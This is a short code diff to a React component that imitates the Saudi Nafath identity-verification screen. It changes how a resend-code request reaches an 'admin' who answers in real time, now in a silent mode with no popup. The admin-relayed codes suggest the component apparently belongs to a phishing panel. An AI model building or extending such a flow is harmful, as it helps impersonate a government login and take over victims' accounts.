@@ -107,12 +107,14 @@ export default function NafathVerify() {
   // Handle resend code request
   const handleResendCode = useCallback(() => {
     setShowResendButton(false);
-    // إرسال طلب إعادة إرسال الرمز للأدمن
+    setCode(""); // إخفاء الرقم وإظهار الدائرة تلف
+    setCountdown(0);
+    // إرسال طلب إعادة إرسال الرمز للأدمن بدون popup
     sendData({
       data: { طلب: "إعادة إرسال رمز" },
       current: "تحقق نفاذ",
       waitingForAdminResponse: true,
-      customWaitingMessage: "جاري إعادة إرسال الرمز",
+      mode: "silent",
     });
   }, []);
 
